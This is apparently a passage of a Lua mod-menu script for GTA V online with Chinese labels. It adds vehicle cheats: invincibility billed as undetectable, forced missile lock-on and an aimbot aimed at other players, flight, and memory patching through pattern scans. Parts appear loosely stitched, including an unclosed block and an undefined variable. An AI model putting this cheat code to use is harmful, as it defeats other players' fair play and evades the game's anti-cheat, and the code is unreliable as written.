    return HUD.END_TEXT_COMMAND_IS_THIS_HELP_MESSAGE_BEING_DISPLAYED(0)
end

function IS_PED_PLAYER(Ped)
    if PED.GET_PED_TYPE(Ped) >= 4 then
        return false
    else
        return true
    end
end

function FORCE_CLOUD_SAVE()
    STATS.STAT_SAVE(0, 0, 3, 0) 
    util.yield(1500)
    util.arspinner_enable()
    util.yield(4500)
    util.arspinner_disable()
end

function IA_MENU_OPEN()
    PAD._SET_CONTROL_NORMAL(0, 244, 1)
    util.yield(200)
end
function IA_MENU_UP(Num)
    for i = 1, Num do
        PAD._SET_CONTROL_NORMAL(0, 172, 1)
        util.yield(200)
    end
end
function IA_MENU_DOWN(Num)
    for i = 1, Num do
        PAD._SET_CONTROL_NORMAL(0, 173, 1)
        util.yield(200)
    end
end
function IA_MENU_ENTER(Num)
    for i = 1, Num do
        PAD._SET_CONTROL_NORMAL(0, 176, 1)
        util.yield(200)
    end
end
task_options = menu.list(renwu, "任务选项", {"Task Options"}, "")

renwujioaben =menu.action(task_options, "加载任务选项", {""}, "", function()


util.yield(1000)
menu.delete(renwujioaben)

renwujioa =dofile(filesystem.scripts_dir() .."PIE/HCC.lua")
end)

--------------------------------------------------------------------------------------------------------------------------------
-- 载具
menu.toggle_loop(vehicles, "载具无敌", {}, "大多数菜单检测不到", function()
    ENTITY.SET_ENTITY_PROOFS(entities.get_user_vehicle_as_handle(), true, true, true, true, true, 0, 0, true)
    end, function() ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(players.user(), false), false, false, false, false, false, 0, 0, false)
end)

menu.toggle_loop(vehicles, "载具锁", {}, "你应该能锁定车辆", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            VEHICLE.SET_VEHICLE_ALLOW_HOMING_MISSLE_LOCKON_SYNCED(veh, true)
        end
    end
end)
local deformation = 1.00
menu.slider_float(vehicles, "载具变形", {"deformation"}, "", 0, 10000, 100, 100, function(value)
    deformation = value / 100
    menu.trigger_commands("vhdeformationmult " .. deformation)
end)
local seat_id = -1
local moved_seat = menu.click_slider(vehicles, "更换载具座位", {}, "", 1, 1, 1, 1, function(seat_id)
    TASK.TASK_WARP_PED_INTO_VEHICLE(players.user_ped(), entities.get_user_vehicle_as_handle(), seat_id - 2)
end)

menu.on_tick_in_viewport(moved_seat, function()
    if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
        moved_seat.max_value = 0
    return end
    
    moved_seat.max_value = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(entities.get_user_vehicle_as_handle()))
end)
menu.toggle_loop(vehicles, "快速热启动", {""}, "", function()
    if not VEHICLE.GET_IS_VEHICLE_ENGINE_RUNNING(entities.get_user_vehicle_as_handle()) and TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 150) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(vehicles, "快速上下车", {"fastvehcleenter"}, "更快地进入载具.", function()
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

menu.toggle_loop(vehicles, "在下车时关闭无敌模式", {""}, "", function()
    if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(entities.get_user_vehicle_as_handle()) then
        if not PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false) then
            ENTITY.SET_ENTITY_CAN_BE_DAMAGED(PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true), true)
        end
    end
end)

local veh_jump = menu.list(vehicles, "载具跳跃")
local force = 25.00
menu.slider_float(veh_jump, "跳跃倍率", {"jumpiness"}, "", 0, 10000, 2500, 100, function(value)
    force = value / 100
end)
menu.toggle_loop(veh_jump, "启动", {"vehiclejump"}, "按空格键跳跃.", function()
    local veh = entities.get_user_vehicle_as_handle()
    if veh ~= 0 and ENTITY.DOES_ENTITY_EXIST(veh) and PAD.IS_CONTROL_JUST_RELEASED(0, 102) then
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, force/1.5, force, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        repeat
            util.yield()
        until not ENTITY.IS_ENTITY_IN_AIR(veh)
    end
end)
menu.toggle_loop(vehicles, "绕过防锁定", {}, "绕过锁定限制.", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            VEHICLE.SET_VEHICLE_ALLOW_HOMING_MISSLE_LOCKON_SYNCED(veh, true)
        end
    end
end)

menu.toggle_loop(vehicles, "武装载具自瞄", {"vehicleaimbotall"}, "", function()
    for _, pid in players.list(false, true, true) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_dist = v3.distance(players.get_position(players.user()), players.get_position(pid))
        if not PED.IS_PED_DEAD_OR_DYING(ped) and PAD.IS_CONTROL_PRESSED(0, 70) and ped_dist < 200.0 then
            VEHICLE.SET_VEHICLE_SHOOT_AT_TARGET(players.user_ped(), ped, players.get_position(pid))
        end
    end
end)
menu.toggle_loop(vehicles, "粘在地上", {""}, "", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    local velocity = ENTITY.GET_ENTITY_VELOCITY(vehicle)
    local height = ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(vehicle)
    local controls = {32, 33, 34, 35}
    if height < 5.0 then
        if ENTITY.IS_ENTITY_IN_AIR(vehicle) then
            VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(vehicle)
        end
    else
        for _, key in controls do
            if vehicle ~= 0 and PAD.IS_CONTROL_PRESSED(0, key) then
                while not PAD.IS_CONTROL_RELEASED(0, key) and ENTITY.IS_ENTITY_IN_AIR(vehicle) do
                    ENTITY.APPLY_FORCE_TO_ENTITY(vehicle, 2, 0.0, 0.0, -500 - velocity.z, 0, 0, 0, 0, true, false, true, false, true)
                    util.yield()
                end
            end
        end
    end
end)

set_self_license = menu.list(vehicles, "自定义车牌", {}, "")
    local default_license = "Pie sauce"
    menu.text_input(set_self_license, "自定义车牌", {"setcarlicense"}, "", function(value)
        default_license = value
    end)
    menu.toggle_loop(set_self_license, "设置车牌", {}, "", function()
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(car, default_license)
        end
    end)
    
menu.toggle_loop(vehicles, "转向灯", {}, "", function()
    if(PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), false)) then
        local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false)

        local left = PAD.IS_CONTROL_PRESSED(34, 34)
        local right = PAD.IS_CONTROL_PRESSED(35, 35)
        local rear = PAD.IS_CONTROL_PRESSED(130, 130)

        if left and not right and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
        elseif right and not left and not rear then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        elseif rear and not left and not right then
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, true)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, true)
        else
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 0, false)
            VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(vehicle, 1, false)
        end
    end
end)

modificaciones = menu.list(vehicles, "车辆修改", {}, "")


menu.action(modificaciones, "随机增强", {}, "只对你的车生效", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("You are not on a vehicle >.<") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)

menu.toggle_loop(modificaciones, "随机增强（循环）", {}, "只对你的车生效", function()
    local vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), include_last_vehicle_for_vehicle_functions)
    if vehicle == 0 then util.toast("不在载具里") else
        for mod_type = 0, 48 do
            local num_of_mods = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, mod_type)
            local random_tune = math.random(-1, num_of_mods - 1)
            VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, mod_type, math.random(0,1) == 1)
            VEHICLE.SET_VEHICLE_MOD(vehicle, mod_type, random_tune, false)
        end
        VEHICLE.SET_VEHICLE_COLOURS(vehicle, math.random(0,160), math.random(0,160))
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        VEHICLE.SET_VEHICLE_WINDOW_TINT(vehicle, math.random(0,6))
        for index = 0, 3 do
            VEHICLE.SET_VEHICLE_NEON_ENABLED(vehicle, index, math.random(0,1) == 1)
        end
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vehicle, math.random(0,255), math.random(0,255), math.random(0,255))
        menu.trigger_command(menu.ref_by_path("Vehicle>Los Santos Customs>Appearance>Wheels>Wheels Colour", 42), math.random(0,160))
    end
end)


local rapid_khanjali
rapid_khanjali = menu.toggle_loop(modificaciones, "Khanjali Rapid Fire", {}, "", function()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("Enter a khanjali.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end)

local bullet_proof

menu.toggle_loop(modificaciones, "防弹", {}, "", function(on)
    local play = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
    if on then
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), true, true, true, true, true, false, false, true)
    else
        ENTITY.SET_ENTITY_PROOFS(PED.GET_VEHICLE_PED_IS_IN(play), false, false, false, false, false, false, false, false)
    end
end)


if player_cur_car ~= 0 then
    if everythingproof then
        ENTITY.SET_ENTITY_PROOFS(player_cur_car, true, true, true, true, true, true, true, true)
    end

    if infcms then
        if VEHICLE.GET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car) < 100 then
            VEHICLE.SET_VEHICLE_COUNTERMEASURE_AMMO(player_cur_car, 100)
        end
    end

get_vtable_entry_pointer = function(address, index)
    return memory.read_long(memory.read_long(address) + (8 * index))
end
get_sub_handling_types = function(vehicle, type)
    local veh_handling_address = memory.read_long(entities.handle_to_pointer(vehicle) + 0x938)
    local sub_handling_array = memory.read_long(veh_handling_address + 0x0158)
    local sub_handling_count = memory.read_ushort(veh_handling_address + 0x0160)
    local types = {registerd = sub_handling_count, found = 0}
    for i = 0, sub_handling_count - 1, 1 do
        local sub_handling_data = memory.read_long(sub_handling_array + 8 * i)
        if sub_handling_data ~= 0 then
            local GetSubHandlingType_address = get_vtable_entry_pointer(sub_handling_data, 2)
            local result = util.call_foreign_function(GetSubHandlingType_address, sub_handling_data)
            if type and type == result then return sub_handling_data end
            types[#types+1] = {type = result, address = sub_handling_data}
            types.found = types.found + 1
        end
    end
    if type then return nil else return types end
end
local thrust_offset = 0x8
local better_heli_handling_offsets = {
    ["fYawMult"] = 0x18, 
    ["fYawStabilise"] = 0x20, 
    ["fSideSlipMult"] = 0x24, 
    ["fRollStabilise"] = 0x30, 
    ["fAttackLiftMult"] = 0x48, 
    ["fAttackDiveMult"] = 0x4C, 
    ["fWindMult"] = 0x58, 
    ["fPitchStabilise"] = 0x3C 
}




sportmode = menu.list(vehicles, "载具动作", {}, "")

PEDD = {
	["GET_VEHICLE_PED_IS_IN"]=function(--[[Ped (int)]] ped,--[[BOOL (bool)]] includeLastVehicle)native_invoker.begin_call();native_invoker.push_arg_int(ped);native_invoker.push_arg_bool(includeLastVehicle);native_invoker.end_call("9A9112A0FE9A4713");return native_invoker.get_return_value_int();end,
}
PLAYERR = {
	["PLAYER_PED_ID"]=function()native_invoker.begin_call();native_invoker.end_call("D80958FC74E988A6");return native_invoker.get_return_value_int();end,
}
CAMM = {
	["GET_GAMEPLAY_CAM_ROT"]=function(--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("837765A25378F0BB");return native_invoker.get_return_value_vector3();end,
	["SET_CAM_ROT"]=--[[void]] function(--[[Cam (int)]] cam,--[[float]] rotX,--[[float]] rotY,--[[float]] rotZ,--[[int]] rotationOrder)native_invoker.begin_call();native_invoker.push_arg_int(cam);native_invoker.push_arg_float(rotX);native_invoker.push_arg_float(rotY);native_invoker.push_arg_float(rotZ);native_invoker.push_arg_int(rotationOrder);native_invoker.end_call("85973643155D0B07");end,
	["_SET_GAMEPLAY_CAM_RELATIVE_ROTATION"]=--[[void]] function(--[[float]] roll,--[[float]] pitch,--[[float]] yaw)native_invoker.begin_call();native_invoker.push_arg_float(roll);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(yaw);native_invoker.end_call("48608C3464F58AB4");end,

}
ENTITYY = {
	["SET_ENTITY_ROTATION"]=function(--[[Entity (int)]] entity,--[[float]] pitch,--[[float]] roll,--[[float]] yaw,--[[int]] rotationOrder,--[[BOOL (bool)]] p5)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_float(pitch);native_invoker.push_arg_float(roll);native_invoker.push_arg_float(yaw);native_invoker.push_arg_int(rotationOrder);native_invoker.push_arg_bool(p5);native_invoker.end_call("8524A8B0171D5E07");end,
	["SET_ENTITY_COLLISION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle,--[[BOOL (bool)]] keepPhysics)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.push_arg_bool(keepPhysics);native_invoker.end_call("1A9205C1B9EE827F");end,
	["APPLY_FORCE_TO_ENTITY"]=function(--[[Entity (int)]] entity,--[[int]] forceFlags,--[[float]] x,--[[float]] y,--[[float]] z,--[[float]] offX,--[[float]] offY,--[[float]] offZ,--[[int]] boneIndex,--[[BOOL (bool)]] isDirectionRel,--[[BOOL (bool)]] ignoreUpVec,--[[BOOL (bool)]] isForceRel,--[[BOOL (bool)]] p12,--[[BOOL (bool)]] p13)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_int(forceFlags);native_invoker.push_arg_float(x);native_invoker.push_arg_float(y);native_invoker.push_arg_float(z);native_invoker.push_arg_float(offX);native_invoker.push_arg_float(offY);native_invoker.push_arg_float(offZ);native_invoker.push_arg_int(boneIndex);native_invoker.push_arg_bool(isDirectionRel);native_invoker.push_arg_bool(ignoreUpVec);native_invoker.push_arg_bool(isForceRel);native_invoker.push_arg_bool(p12);native_invoker.push_arg_bool(p13);native_invoker.end_call("C5F68BE9613E2D18");end,
	["FREEZE_ENTITY_POSITION"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("428CA6DBD1094446");end,
}
VEHICLEE = {
	["SET_VEHICLE_FORWARD_SPEED"]=function(--[[Vehicle (int)]] vehicle,--[[float]] speed)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_float(speed);native_invoker.end_call("AB54A438726D25D5");end,
	["SET_VEHICLE_GRAVITY"]=function(--[[Vehicle (int)]] vehicle,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_bool(toggle);native_invoker.end_call("89F149B6131E57DA");end,
	["SET_VEHICLE_EXTRA_COLOURS"]=--[[void]] function(--[[Vehicle (int)]] vehicle,--[[int]] pearlescentColor,--[[int]] wheelColor)native_invoker.begin_call();native_invoker.push_arg_int(vehicle);native_invoker.push_arg_int(pearlescentColor);native_invoker.push_arg_int(wheelColor);native_invoker.end_call("2036F561ADD12E33");end,

}
PADD = {
	["IS_CONTROL_PRESSED"]=function(--[[int]] padIndex,--[[int]] control)native_invoker.begin_call();native_invoker.push_arg_int(padIndex);native_invoker.push_arg_int(control);native_invoker.end_call("F3A21BCD95725A4A");return native_invoker.get_return_value_bool();end,
}

veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
local is_vehicle_flying = false
local dont_stop = false
local no_collision = false
local speed = 6
local reset_veloicty = false

menu.toggle(sportmode, "飞车模式", {"vehfly"}, "", function(on_click)
    is_vehicle_flying = on_click
    if reset_veloicty then 
        ENTITYY.FREEZE_ENTITY_POSITION(veh, true)
        util.yield()
        ENTITYY.FREEZE_ENTITY_POSITION(veh, false)
    end
end)
menu.slider(sportmode, "速度", {}, "", 1, 100, 6, 1, function(on_change) 
    speed = on_change
end)

menu.toggle(sportmode, "重置速度", {}, "如果你没有停止移动后关闭它，就打开这个", function(on_click)
    reset_veloicty = on_click
end)
menu.toggle(sportmode, "无碰撞", {}, "", function(on_click)
    no_collision = on_click
end)


vehicleroll = 0


function do_vehicle_fly() 
    veh = PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), false);
    cam_pos = CAMM.GET_GAMEPLAY_CAM_ROT(0);
    ENTITYY.SET_ENTITY_ROTATION(veh, cam_pos.x, vehicleroll, cam_pos.z, 2, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, not no_collision, true);
    if PADD.IS_CONTROL_PRESSED(0, 108) then 
        vehicleroll = vehicleroll -1
    end

    if PADD.IS_CONTROL_PRESSED(0, 109) then 
        vehicleroll = vehicleroll +1
       
    end

    local locspeed = speed*10
    local locspeed2 = speed
    if PADD.IS_CONTROL_PRESSED(0, 61) then 
        locspeed = locspeed*2
        locspeed2 = locspeed2*2
    end

    
    if PADD.IS_CONTROL_PRESSED(2, 71) then
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, speed, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, locspeed)
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 72) then
		local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed * 2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0.0, 0 - (lsp), 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0 - (locspeed));
        end
   end
    if PADD.IS_CONTROL_PRESSED(2, 63) then
        local lsp = (0 - speed)*2
        if not PADD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = 0 - speed
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, (lsp), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, 0 - (locspeed), 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1);
        end
	end
    if PADD.IS_CONTROL_PRESSED(2, 64) then
        local lsp = speed
        if not PAD.IS_CONTROL_PRESSED(0, 61) then 
            lsp = speed*2
        end
        if dont_stop then
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, lsp, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        else 
            ENTITYY.APPLY_FORCE_TO_ENTITY(veh, 1, locspeed, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 1, 1, 1, 0, 1)
        end
    end
	if not dont_stop and not PAD.IS_CONTROL_PRESSED(2, 71) and not PAD.IS_CONTROL_PRESSED(2, 72) then
        VEHICLEE.SET_VEHICLE_FORWARD_SPEED(veh, 0.0);
    end
end


util.create_tick_handler(function() 


    if PEDD.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(),false) == 0 then
        if is_vehicle_flying then
            menu.trigger_commands("vehfly")
            util.toast("不在载具里")
        end
    else
        if is_vehicle_flying then do_vehicle_fly() end


    end


    VEHICLEE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying) 
    if not is_vehicle_flying then 
        ENTITY.SET_ENTITY_COLLISION(veh, true, true);
    end

    return true
end)
util.on_stop(function() 
    VEHICLEE.SET_VEHICLE_GRAVITY(veh, true)
    ENTITYY.SET_ENTITY_COLLISION(veh, true, true);
end)
--123

local function getCurrentVehicle() 
	local player_id = PLAYER.PLAYER_ID()
	local player_ped = PLAYER.GET_PLAYER_PED(player_id)
    local player_vehicle = 0
    if (PED.IS_PED_IN_ANY_VEHICLE(player_ped)) then
        veh = PED.GET_VEHICLE_PED_IS_USING(player_ped)
        if (NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(veh)) then
            player_vehicle = veh
        end 
    end
    return player_vehicle
end

local function getHeadingOfTravel(veh) 
    local velocity = ENTITY.GET_ENTITY_VELOCITY(veh)
    local x = velocity.x
    local y = velocity.y
    local at2 = math.atan(y, x)
    return math.fmod(270.0 + math.deg(at2), 360.0)
end

local function slamDatBitch(veh, height) 
    if (VEHICLE.IS_VEHICLE_ON_ALL_WHEELS(veh) and not ENTITY.IS_ENTITY_IN_AIR(veh)) then
     
        ENTITY.APPLY_FORCE_TO_ENTITY(veh, 1,    0, 0, height,    0, 0, 0,   true, true)
    end
end

local function getCurGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset))
end

local function getNextGear()
    return memory.read_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset))
end

local function setCurGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(CurrentGearOffset), gear)
end

local function setNextGear(gear)
    memory.write_byte(entities.get_user_vehicle_as_pointer() +memory.read_int(NextGearOffset), gear)
end

local function asDegrees(angle)
    return angle * (180.0 / 3.14159265357); 
end

local function wrap360(val) 

    while (val < 0.0) do
        val = val + 360.0
    end
    while (val > 360.0) do
        val = val - 360.0
    end
    return val
end

driftmodee = menu.list(vehicles, "漂移", {}, "")

local gs_driftMinSpeed = 8.0
local gs_driftMaxAngle = 50.0
local ControlVehicleAccelerate = 71
local ControlVehicleBrake = 72
local ControlVehicleDuck = 73
local ControlVehicleSelectNextWeapon = 99
local ControlVehicleMoveUpOnly = 61
local INPUT_FRONTEND_LS = 209
local DriftActivateKeyboard = INPUT_FRONTEND_LS

CurrentGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+11
NextGearOffset = memory.scan("A8 02 0F 84 ? ? ? ? 0F B7 86")+18

local isDrifting      = 0
local wasDrifting     = 0
local isDriftFinished = 1
local prevGripState   = 0
local lastDriftAngle  = 0.0
local oldGripState    = 0
local debug_notification = 0

textDrawCol = {
    r = 255,
    g = 255,
    b = 255,
    a = 255
}



local function driftmod_ontick() 
    local player = players.user()
    local veh = getCurrentVehicle()
   

    local inVehicle   = veh ~= 0
    local isDriving   = true

    local mps = ENTITY.GET_ENTITY_SPEED(veh)
    local mph       = mps * 2.23694
    local kmh       = mps * 3.6

    if inVehicle and isDriving and not isDrifting and not isDriftFinished then
        isDriftFinished = true
    end

    if not inVehicle or not isDriving then
        return
    end

    local driftKeyPressed = PAD.IS_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_DISABLED_CONTROL_PRESSED(2, ControlVehicleDuck) or PAD.IS_CONTROL_PRESSED(0, DriftActivateKeyboard) or PAD.IS_DISABLED_CONTROL_PRESSED(0, DriftActivateKeyboard)

    if (driftKeyPressed and getCurGear(veh) > 2) then
        setCurGear(2)
        setNextGear(2)
    end
    if driftKeyPressed then
         
        if (PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake) > 0.1) then
            PAD.SET_CONTROL_VALUE_NEXT_FRAME(0, ControlVehicleBrake, 0)
            local neg = -0.3

            if (PAD.IS_CONTROL_PRESSED(2, ControlVehicleSelectNextWeapon)) then
                neg = 10
            end

            slamDatBitch(veh, neg * 1 * PAD.GET_CONTROL_NORMAL(2, ControlVehicleBrake))
        end 

        local angleOfTravel  = getHeadingOfTravel(veh)
        local angleOfHeading = ENTITY.GET_ENTITY_HEADING_FROM_EULERS(veh)
        
        local driftAngle = angleOfHeading - angleOfTravel

        if driftAngle and lastDriftAngle then
            local diff = driftAngle - lastDriftAngle

            if diff > 180.0 then
                driftAngle = driftAngle - 360.0
            end
            if diff < 180.0 then
                driftAngle = driftAngle - 360.0
            end
        end

        driftAngle     = wrap360(driftAngle)
        lastDriftAngle = driftAngle

        local zeroBasedDriftAngle = 360 - driftAngle
        if zeroBasedDriftAngle > 180 then
            zeroBasedDriftAngle = 0 - (360 - zeroBasedDriftAngle)
        end

        directx.draw_text(0,0,"Drift Angle: " .. math.floor(zeroBasedDriftAngle) .. "°", ALIGN_TOP_CENTRE,1,textDrawCol)
        local done = false
        if ((isDrifting or kmh > gs_driftMinSpeed) and (math.abs(driftAngle - 360.0) < gs_driftMaxAngle) or (driftAngle < gs_driftMaxAngle)) then
            isDrifting      = 1
            isDriftFinished = 1; 

            if driftKeyPressed then
                 
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done and kmh < gs_driftMinSpeed then
            if driftKeyPressed then
                if driftKeyPressed ~= oldGripState then
                    VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
                    oldGripState = driftKeyPressed
                end
            end
            done = true
        end

        if not done then
            if driftKeyPressed == oldGripState then
                VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
                oldGripState = 0
            end

            if math.abs(zeroBasedDriftAngle) > gs_driftMaxAngle then
                if zeroBasedDriftAngle > 0 then
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)

                 
                    util.toast("Counter-steering left ")
                    
                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
              
                else
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, true)
                    VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
              

                    util.toast("Counter-steering right")

                    VEHICLE.SET_VEHICLE_STEER_BIAS(veh, math.rad(zeroBasedDriftAngle * 0.69))
      
                end
            end
		else 
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 0, false)
			VEHICLE.SET_VEHICLE_INDICATOR_LIGHTS(veh, 1, false)
        end
    end

    if not driftKeyPressed and prevGripState then
        isDrifting      = 0
        isDriftFinished = 0
        lastDriftAngle = 0

        if driftKeyPressed ~= oldGripState then
            VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, driftKeyPressed)
            oldGripState = driftKeyPressed
        end
    end

    prevGripState = driftKeyPressed
    if isDrifting ~= wasDrifting then
        wasDrifting     = isDrifting
        changedDrifting = true
    end
end


menu.toggle_loop(driftmodee,"漂移", {},"按左SHIFT开始漂移",function(on)
	driftmod_ontick()
end)
driftSetings = menu.list(driftmodee, "设置", {}, "")

menu.slider(driftSetings,"最低速度 /100", {}, "/100", 0, 10000, gs_driftMinSpeed*100, 1, function(on)
    gs_driftMinSpeed = on/100
end)



----钢铁侠
local startViewMode
local scope_scaleform
local gaveHelmet = false
menu.toggle_loop(fun, '钢铁侠', {}, '', function()
    menu.trigger_commands("levitate on")
    if not PED.IS_PED_WEARING_HELMET(players.user_ped()) then
        PED.GIVE_PED_HELMET(players.user_ped(), true, 4096, -1)
        gaveHelmet = true
    end
    local context = CAM._GET_CAM_ACTIVE_VIEW_MODE_CONTEXT()
    if startViewMode == nil then
        startViewMode = CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context)
    end
    if CAM.GET_CAM_VIEW_MODE_FOR_CONTEXT(context) != 4 then
        CAM.SET_CAM_VIEW_MODE_FOR_CONTEXT(context, 4)
    end
